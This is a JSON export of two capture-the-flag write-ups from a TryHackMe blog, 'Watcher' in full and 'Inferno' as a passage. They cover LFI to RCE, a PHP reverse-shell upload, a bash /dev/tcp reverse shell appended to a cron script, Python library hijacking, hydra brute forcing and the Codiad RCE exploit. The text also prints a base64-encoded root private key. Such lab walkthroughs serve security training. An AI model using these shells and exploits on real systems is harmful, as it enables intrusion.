[{"content":"   Title  Watcher     Info  A boot2root Linux machine utilizing web exploits along with some common privilege escalation techniques.   Difficulty  Medium   Date 2021/02/17    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.142.217\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Nmap scan report for 10.10.142.217 Host is up (0.069s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA) | 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA) |_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Jekyll v4.1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Corkplacemats No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   Directory Brute-Forcing Next, we will scan the website with gobuster for interesting directories and files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  gobuster dir -e -u 10.10.142.217 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.217.134 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/18 10:54:39 Starting gobuster =============================================================== http://10.10.217.134/.hta (Status: 403) http://10.10.217.134/.htpasswd (Status: 403) http://10.10.217.134/.htaccess (Status: 403) http://10.10.217.134/css (Status: 301) http://10.10.217.134/images (Status: 301) http://10.10.217.134/index.php (Status: 200) http://10.10.217.134/robots.txt (Status: 200) http://10.10.217.134/server-status (Status: 403) =============================================================== 2021/02/18 10:55:14 Finished ===============================================================   The most noticeable found resource is robots text file.\n Supporting article\nhttps://moz.com/learn/seo/robotstxt\n Robots Visiting the web page and traversing to /robots.txt we can read the first flag. Also notice there is another text file to which we don\u0026rsquo;t have access yet.\n\nLocal File Inclusion Clicking on any picture on the home page we are redirected to its own description.\nUpon redirection a new query is added to URL: /post.php?post=round.php\n\nAfter trying to access /etc/passed we will get the content printed on the page.\nThis confirms this page has Local File Inclusion Vulnerability. We have also discovered we can perform a Directory Traversal attack.\n1  http://10.10.142.217/post.php?post=secret_file_do_not_read.txt   \nWe will use found credentials to successfully login in to ftp.\nListing all the files in the current directory, we can see we found the second flag.\nUse get flag_2.txt to download the text file to our local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ftp 10.10.142.217 Connected to 10.10.142.217. 220 (vsFTPd 3.0.3) Name (10.10.142.217:root): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 files -rw-r--r-- 1 0 0 21 Dec 03 01:58 flag_2.txt 226 Directory send OK. ftp\u0026gt;    Supporting article\nhttps://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/\n LFI to Remote Code Execution To perform RCE, we will need a php reverse shell which we can download from here. Do not forgive to edit it to match our local machine IP and a port of our choice.\nGoing back to ftp sever and navigating to /files directory following with put reverse-shell.php we will upload our reverse shell to the desired location.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. 226 Directory send OK. ftp\u0026gt; put reverse-shell.php local: reverse-shell.php remote: reverse-shell.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 5494 bytes sent in 0.00 secs (34.4703 MB/s) ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Feb 18 14:05 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. -rw-r--r-- 1 1001 1001 5494 Feb 18 14:05 reverse-shell.php 226 Directory send OK. ftp\u0026gt;   Next, we will start a listener on our local machine.\nBased on the note found previously and discovered vulnerability, we will navigate in the browser to following url:\n1  http://10.10.142.217/post.php?post=/home/ftpuser/ftp/files/reverse-shell.php   Upon performing the request above we will get a reverse shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.142.217] 44898 Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 14:06:10 up 25 min, 0 users, load average: 0.00, 0.03, 0.28 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ whoami www-data $   To upgrade our current shell, we will use following command:\n1  python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;   Navigating to /more_secrets_a9f10a and listing its content we can spot the third flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  www-data@watcher:/var/www/html$ ls -la ls -la total 60 drwxr-xr-x 5 root root 4096 Dec 3 01:52 . drwxr-xr-x 3 root root 4096 Dec 3 01:39 .. -rw-r--r-- 1 root root 47 Dec 3 01:47 .htaccess -rw-r--r-- 1 root root 3445 Dec 3 01:42 bunch.php drwxr-xr-x 2 root root 4096 Dec 3 01:42 css -rw-r--r-- 1 root root 35 Dec 3 01:42 flag_1.txt drwxr-xr-x 2 root root 4096 Dec 3 01:42 images -rw-r--r-- 1 root root 4826 Dec 3 01:42 index.php drwxr-xr-x 2 root root 4096 Dec 3 01:42 more_secrets_a9f10a -rw-r--r-- 1 root root 2454 Dec 3 01:52 post.php -rw-r--r-- 1 root root 69 Dec 3 01:43 robots.txt -rw-r--r-- 1 root root 3440 Dec 3 01:42 round.php -rw-r--r-- 1 root root 156 Dec 3 01:44 secret_file_do_not_read.txt -rw-r--r-- 1 root root 3446 Dec 3 01:42 striped.php   1 2 3 4 5 6 7 8 9 10 11  www-data@watcher:/var/www/html$ cd more_secrets_a9f10a cd more_secrets_a9f10a www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls -la ls -la total 12 drwxr-xr-x 2 root root 4096 Dec 3 01:42 . drwxr-xr-x 5 root root 4096 Dec 3 01:52 .. -rw-r--r-- 1 root root 21 Dec 3 01:42 flag_3.txt www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt | wc -c cat flag_3.txt | wc -c 21    Supporting article\nhttps://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2\n Lateral Movement Running sudo -l command we check our sudo permissions.\n1 2 3 4 5 6 7 8  www-data@watcher:/var/www/html/more_secrets_a9f10a$ sudo -l sudo -l Matching Defaults entries for www-data on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on watcher: (toby) NOPASSWD: ALL   From the output above, we see that we can run all commands without a password as the toby user.\nWe will use this fact to execute a bash shell as the toby user and read the fourth flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  www-data@watcher:/home/toby$ sudo -u toby bash sudo -u toby bash toby@watcher:~$ id id uid=1003(toby) gid=1003(toby) groups=1003(toby) toby@watcher:~$ ls -la ls -la total 44 drwxr-xr-x 6 toby toby 4096 Dec 12 15:25 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 root root 9 Dec 3 02:34 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 toby toby 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 toby toby 3771 Dec 3 01:58 .bashrc drwx------ 2 toby toby 4096 Dec 3 02:40 .cache drwx------ 3 toby toby 4096 Dec 3 02:40 .gnupg drwxrwxr-x 3 toby toby 4096 Dec 3 01:58 .local -rw-r--r-- 1 toby toby 807 Dec 3 01:58 .profile -rw------- 1 toby toby 21 Dec 3 01:58 flag_4.txt drwxrwxr-x 2 toby toby 4096 Dec 3 03:31 jobs -rw-r--r-- 1 mat mat 89 Dec 12 15:25 note.txt toby@watcher:~$ cat flag_4.txt | wc -c cat flag_4.txt | wc -c 21    Supporting article\nhttps://www.explainshell.com/explain?cmd=sudo+-l\n Cron Jobs Reading the note text file in the toby\u0026rsquo;s home directory we will found out that there is a cron job.\n1 2 3 4 5 6 7  toby@watcher:~$ cat note.txt cat note.txt Hi Toby, I\u0026#39;ve got the cron jobs set up now so don\u0026#39;t worry about getting that done. Mat   Reading crontab file we can confirm that there is a script which runs every minute as the mat user.\nEven though toby owns this file, the script is executed in the context of the user running the cron job.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  toby@watcher:~$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # */1 * * * * mat /home/toby/jobs/cow.sh   Printing the content of the script, we can see it is performing simple copying of a cow image.\n1 2 3 4 5 6 7 8 9 10 11 12  toby@watcher:~$ cd jobs\tcd jobs toby@watcher:~/jobs$ ls -la ls -la total 12 drwxrwxr-x 2 toby toby 4096 Dec 3 03:31 . drwxr-xr-x 6 toby toby 4096 Dec 12 15:25 .. -rwxr-xr-x 1 toby toby 46 Dec 3 03:31 cow.sh toby@watcher:~/jobs$ cat cow.sh cat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg   We will append a bash reverse shell with changed port into the file which cronjob will execute.\n1 2 3 4 5 6 7  toby@watcher:~/jobs$ echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; cow.sh \u0026lt;h -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; cow.sh toby@watcher:~/jobs$cat cow.sh\tcat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;   Next, we will set up another netcat listener.\nThen after a minute, user mat will execute modified bash script and we will receive a reverse shell as this user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  nc -lnvp 5555 listening on [any] 5555 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.142.217] 52132 bash: cannot set terminal process group (2057): Inappropriate ioctl for device bash: no job control in this shell mat@watcher:~$ id id uid=1002(mat) gid=1002(mat) groups=1002(mat) mat@watcher:~$ ls -la ls -la total 312 drwxr-xr-x 6 mat mat 4096 Dec 3 03:31 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 root root 9 Dec 3 02:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 mat mat 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 mat mat 3771 Dec 3 01:58 .bashrc drwx------ 2 mat mat 4096 Dec 3 02:47 .cache -rw-r--r-- 1 mat mat 270433 Dec 3 01:58 cow.jpg -rw------- 1 mat mat 37 Dec 3 01:58 flag_5.txt drwx------ 3 mat mat 4096 Dec 3 02:47 .gnupg drwxrwxr-x 3 mat mat 4096 Dec 3 01:58 .local -rw-r--r-- 1 will will 141 Dec 3 01:58 note.txt -rw-r--r-- 1 mat mat 807 Dec 3 01:58 .profile drwxrwxr-x 2 will will 4096 Dec 3 03:31 scripts mat@watcher:~$ cat flag_5.txt | wc -c cat flag_5.txt | wc -c 37    Supporting article\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs\n Python Library Hijacking Once again we will start by running sudo -l command to check our sudo permissions.\n1 2 3 4 5 6 7 8  mat@watcher:~$ sudo -l sudo -l Matching Defaults entries for mat on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mat may run the following commands on watcher: (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *   From the output above, we see that we can run a python script called will_script.py with any argument as the will user.\n1 2 3 4 5 6 7 8  mat@watcher:~/scripts$ ls -la ls -la total 16 drwxrwxr-x 2 will will 4096 Dec 3 03:31 . drwxr-xr-x 6 mat mat 4096 Dec 3 03:31 .. -rw-r--r-- 1 mat mat 133 Dec 3 03:31 cmd.py -rw-r--r-- 1 will will 208 Dec 3 01:58 will_script.py mat@watcher:~/scripts$   Let\u0026rsquo;s check what these two scripts actually do.\n1  mat@watcher:~/scripts$ cat cmd.py   1 2 3 4 5 6 7  def get_command(num): if(num == \u0026#34;1\u0026#34;): return \u0026#34;ls -lah\u0026#34; if(num == \u0026#34;2\u0026#34;): return \u0026#34;id\u0026#34; if(num == \u0026#34;3\u0026#34;): return \u0026#34;cat /etc/passwd\u0026#34;   1  mat@watcher:~/scripts$ cat will_script.py   1 2 3 4 5 6 7 8 9 10 11 12 13  import os import sys from cmd import get_command cmd = get_command(sys.argv[1]) whitelist = [\u0026#34;ls -lah\u0026#34;, \u0026#34;id\u0026#34;, \u0026#34;cat /etc/passwd\u0026#34;] if cmd not in whitelist: print(\u0026#34;Invalid command!\u0026#34;) exit() os.system(cmd)   Based on the argument provided to the will_script.py a system command is return from the cmd.py and then executed. We should notice the whitelist array of command we are allowed to use.\nI personally tried to insert a simple import os; os.system(\u0026quot;/bin/bash\u0026quot;)\ncommand at the top of the cmd.py with sed and then with awk but I was not successful, so I used SSH to get a proper shell and then I used nano to edit the script and insert this line on the top of the file.\n How to SSH into the machine?\n Create key pairs for SSH with ssh-keygen command. Copy the id_rsa.pub file to the authorized_keys file with cp id_rsa.pub authorized_keys command inside the .ssh directory. Copy the content of the private key (id_rsa) to your local machine. Set permissions of the private key with chmod 600 id_rsa command. Login as mat user with ssh -i id_rsa mat@IP   1 2 3 4 5 6 7 8 9  import os os.system(\u0026#34;/bin/bash\u0026#34;) def get_command(num): if(num == \u0026#34;1\u0026#34;): return \u0026#34;ls -lah\u0026#34; if(num == \u0026#34;2\u0026#34;): return \u0026#34;id\u0026#34; if(num == \u0026#34;3\u0026#34;): return \u0026#34;cat /etc/passwd\u0026#34;   To spawn a shell as a will user is not conditional based on the argument provided to will_script.py because we successfully inserted bash spawning at the very beginning.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2 will@watcher:~/scripts$ whoami will will@watcher:~/scripts$ id uid=1000(will) gid=1000(will) groups=1000(will),4(adm) will@watcher:~/scripts$ cd /home/will will@watcher:/home/will$ ls -la total 36 drwxr-xr-x 5 will will 4096 Dec 3 02:31 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 will will 9 Dec 3 02:31 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 will will 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 will will 3771 Dec 3 01:58 .bashrc drwx------ 2 will will 4096 Dec 3 01:58 .cache drwxr-x--- 3 will will 4096 Dec 3 02:19 .config -rw------- 1 will will 41 Dec 3 01:58 flag_6.txt drwx------ 3 will will 4096 Dec 3 02:12 .gnupg -rw-r--r-- 1 will will 807 Dec 3 01:58 .profile -rw-r--r-- 1 will will 0 Dec 3 01:58 .sudo_as_admin_successful will@watcher:/home/will$ cat flag_6.txt | wc -c 41    Supporting article\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking\n Private Key Backup Performing basic manual directory enumeration, we will find a key backup located inside /opt/backup.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  will@watcher:/home/will$ cd /opt will@watcher:/opt$ ls -la total 12 drwxr-xr-x 3 root root 4096 Dec 3 02:03 . drwxr-xr-x 24 root root 4096 Dec 12 15:22 .. drwxrwx--- 2 root adm 4096 Dec 3 02:04 backups will@watcher:/opt$ cd backups/ will@watcher:/opt/backups$ ls -la total 12 drwxrwx--- 2 root adm 4096 Dec 3 02:04 . drwxr-xr-x 3 root root 4096 Dec 3 02:03 .. -rw-rw---- 1 root adm 2270 Dec 3 02:04 key.b64 will@watcher:/opt/backups$ cat key.b64 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45 ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3 YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5 cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3 c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2 TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2 TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0 bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4 NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4 STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=   Use CyberChef to decode its content from base64 (based on the file extension and also because of padding with \u0026ldquo;=\u0026quot;).\n\nAfter decoding the content, we can see that it is a private key which we will use to successfully login as a root user and read the last flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  chmod 600 id_rsa ssh -i id_rsa root@10.10.217.134 root@watcher:~# id uid=0(root) gid=0(root) groups=0(root) root@watcher:~# ls -la total 40 drwx------ 6 root root 4096 Dec 3 02:32 . drwxr-xr-x 24 root root 4096 Dec 12 15:22 .. lrwxrwxrwx 1 root root 9 Dec 3 02:32 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 Dec 3 01:42 .cache -rw-r--r-- 1 root root 31 Dec 3 02:26 flag_7.txt drwx------ 3 root root 4096 Dec 3 01:42 .gnupg drwxr-xr-x 3 root root 4096 Dec 3 01:41 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 66 Dec 3 02:07 .selected_editor drwx------ 2 root root 4096 Dec 3 02:04 .ssh root@watcher:~# cat flag_7.txt | wc -c 31    Supporting article\nhttps://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host\n \rThank you for reading this blog post.\n","description":"A boot2root Linux machine utilizing web exploits along with some common privilege escalation techniques.","id":0,"section":"posts","tags":["enumeration","brute force","decoding","cron job","python","privilege escalation"],"title":"Watcher [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/watcher/"},{"content":"   Title  Inferno     Info  Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing   Difficulty  Medium   Date 2021/02/16    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.241.114\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  nmap -v -A -T4 10.10.241.114 Nmap scan report for 10.10.241.114 Host is up (0.10s latency). Not shown: 958 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA) | 256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA) |_ 256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519) 23/tcp open telnet? 25/tcp open smtp? |_smtp-commands: Couldn\u0026#39;t establish connection on port 25 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Dante\u0026#39;s Inferno 88/tcp open kerberos-sec? 106/tcp open pop3pw? 110/tcp open pop3? 389/tcp open ldap? 443/tcp open https? 464/tcp open kpasswd5? 636/tcp open ldapssl? 777/tcp open multiling-http? 783/tcp open spamassassin? 808/tcp open ccproxy-http? 873/tcp open rsync? 1001/tcp open webpush? 1236/tcp open bvcontrol? 1300/tcp open h323hostcallsc? 2000/tcp open cisco-sccp? 2003/tcp open finger? |_finger: ERROR: Script execution failed (use -d to debug) 2121/tcp open ccproxy-ftp? 2601/tcp open zebra? 2602/tcp open ripd? 2604/tcp open ospfd? 2605/tcp open bgpd? 2607/tcp open connection? 2608/tcp open wag-service? 4224/tcp open xtell? 5051/tcp open ida-agent? 5432/tcp open postgresql? 5555/tcp open freeciv? 5666/tcp open nrpe? 6346/tcp open gnutella? 6566/tcp open sane-port? 6667/tcp open irc? |_irc-info: Unable to open connection 8021/tcp open ftp-proxy? 8081/tcp open blackice-icecap? 8088/tcp open radan-http? 9418/tcp open git? 10000/tcp open snet-sensor-mgmt? 10082/tcp open amandaidx? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   Analyzing the output we will find that only two ports are legitimate, 22 (ssh) and 80 (http).\nBecause we don’t have ssh credentials yet, let\u0026rsquo;s visit port 80 in our browser.\n\nWe are welcome with Map of Hell by Botticelli inspired by Dante\u0026rsquo;s Divine Comedy.\nNothing interesting can be found in the page source.\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  gobuster dir -e -u http://10.10.241.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.241.114 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: bak,old,js,php,txt,html [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/16 13:23:36 Starting gobuster =============================================================== /index.html (Status: 200) /inferno (Status: 401) /server-status (Status: 403)   Navigating to /inferno we are prompted to authenticate.\n\nService Brute-Forcing We will try to brute force authentication with hydra and custom user list consisting of following usernames:\n admin\nadministrator\nroot\ndante\ninferno\n 1 2 3 4 5 6 7  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.241.114 -m /inferno http-get [DATA] max 16 tasks per 1 server, overall 16 tasks, 71721995 login tries (l:5/p:14344399), ~4482625 tries per task [DATA] attacking http-get://10.10.241.114:80/inferno [STATUS] 1745.00 tries/min, 1745 tries in 00:01h, 71720250 to do in 685:01h, 16 active [STATUS] 2242.00 tries/min, 6726 tries in 00:03h, 71715269 to do in 533:08h, 16 active [80][http-get] host: 10.10.241.114 login: admin password: [REDACTED]   After few minutes valid set of credentials is found.\nGaining Access Using obtained password along with username for required authentication redirects us to another login form, where we will once again use the same credentials.\n\nWe are successfully in!\n\nExploitation Searching for Codiad we will find that it is a web-based IDE framework. Proceed with searching for \u0026ldquo;codiad exploit\u0026rdquo;. We found Github repository with RCE (Remote Code Execute) Exploit for Codiad. This exploit let us execute system command on Codiad to get a reverse shell. Clone this repository with git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git and follow the instructions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  python exploit.py http://10.10.241.114/inferno/ admin [REDACTED] 10.9.149.180 1234 linux [+] Please execute the following command on your vps: echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.149.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234 nc -lnvp 1235 [+] Please confirm that you have done the two command above [y/n] [Y/n] y [+] Starting... [+] Login Content : \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; 